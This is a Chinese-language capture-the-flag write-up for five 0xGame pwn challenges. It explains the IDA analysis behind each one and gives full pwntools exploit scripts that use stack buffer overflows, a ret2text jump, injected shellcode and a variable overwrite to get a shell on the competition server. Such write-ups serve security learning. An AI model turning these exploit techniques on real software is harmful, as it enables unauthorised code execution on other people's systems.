---
title: Pwn_0xGame_01
categories: 
    - 比赛WriteUp
    - 0xGame
---
# Pwn_0xGame_01
<!--more-->

## 1.欢迎来到0xGame平台
`nc`出flag

## 2.帮我取一个题目名称
ret2text
打开IDA分析
main函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018162746427.png#pic_center)

跟进
第二个函数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018162919579.png#pic_center)

s栈大小为20h=32
函数最后return read了s
所以很好写了
因为是64位程序，后面再加上8个字符

```python
payload = 'a' * (0x20+8)
```
Shift+F12发现/bin/sh

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018163358221.png#pic_center)


exp：

```python
from pwn import* 
p = remote('39.101.210.214 ',10002) 
payload = 'a' * (0x20+8) + p64(0x401172)
p.sendline(payload) 
p.interactive()
```

## 3.easy_stack 
文件
easy_stack.txt：

```python
> ────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────
> EAX  0xffffcff0 ◂— 0x0
> EBX  0x56558fb8 ◂— 0x3ec0
> ECX  0xffffffff
> EDX  0xffffffff
> EDI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c
> ESI  0xf7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c
> EBP  0xffffd078 —▸ 0xffffd088 ◂— 0x0
> ESP  0xffffcfe0 ◂— 0x0
> EIP  0x56556273 —▸ 0xfffdb8e8 ◂— 0x0
>─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────
> ► 0x56556273    call   read@plt <0x56556030>
>   0x56556278    add    esp, 0x10
>   0x5655627b    nop    
>   0x5655627c    mov    ebx, dword ptr [ebp - 4]
>   0x5655627f    leave  
>   0x56556280    ret    
>──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────
>00:0000│ esp  0xffffcfe0 ◂— 0x0
>01:0004│      0xffffcfe4 —▸ 0xffffcff0 ◂— 0x0
>02:0008│      0xffffcfe8 ◂— 0x100
>03:000c│      0xffffcfec —▸ 0x56556234 ◂— 0x2d84c381
>04:0010│ eax  0xffffcff0 ◂— 0x0
>... ↓
```

► 0x56556273    call   read@plt <0x56556030>
调用了read函数，再看看read函数中的三个参数
	
	read (fd, char *buf , count)
fd：文件描述符（文件指针） //fd写0,表示标准输入

buf：指向内存的指针 			//也就是把数据写入的起始地址

count：读取的长度

再结合文件中

```
> 00:0000│ esp  0xffffcfe0 ◂— 0x0 
> 01:0004│      0xffffcfe4 —▸ 0xffffcff0◂— 0x0 
> 02:0008│      0xffffcfe8 ◂— 0x100
```

然后我们再观察ebp和eax的值

```
> EAX  0xffffcff0 ◂— 0x0
> EBP  0xffffd078 —▸ 0xffffd088 ◂— 0x0
```

因为通常返回地址是存在ebp下，所以计算一下偏移量 0xffffd078 - 0xffffcff0 = 0x88
read读取的数据长度是0x100
0x88 < 0x100 
所以存在溢出
nc连接会回显个地址，并且这个地址是随机的

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201018193434919.png#pic_center)

我们可以接收这个地址并让程序执行它
exp：

```python

from pwn import* 
p = remote('39.101.210.214',10008) 
p.recvuntil('magic_address ') 
shell = int(p.recv(10),16) 
p.send('a' * (0x88+4) + p32(shell)) 
p.interactive()
```
## 4.该怎么起名呢

### shellcode

题目让我们执行shellcode，但程序是64位的，pwntools生成的shellcode是32位的，所以我们需要设置架构
context.arch='AMD64' ，否则有可能会报错

再看IDA

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201019195422415.png#pic_center)

关键的在下面的buf+32

所以我们需要填充32个字符之后再送出shellcode

生成 shellcode

> asm(shellcraft.sh())


运行一下文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201019200641989.png#pic_center)

需要在'shellcode'之后再发送payload

所以要recvuntil('shellcode')

exp：

```python
from pwn import* 
context.arch = 'AMD64' 
p = remote('39.101.210.214',10003)
payload = 'a' * 32 + asm(shellcraft.sh())
p.recvuntil('shellcode')
p.sendline(payload)
p.interactive()
```
## 5.variable_coverage 
### 变量覆盖

IDA分析下

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201019205534671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

程序读取%lld 一个longlong的数，它的长度为8个字节
后面判断v5等于0x2333后会调用system函数
构造payload = 0x233300000000
再看栈

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201019210240376.png#pic_center)

4个字节的长度刚好是0x 0000 2333 0000 0000
也可以直接写0x233300000000，系统会自动填充前面的4个0，因为这是16进制的数

exp：

```python
from pwn import* 

p = remote('39.101.210.214',10007) 

payload =  str(0x233300000000) 

p.sendline(payload)

p.interactive()

```
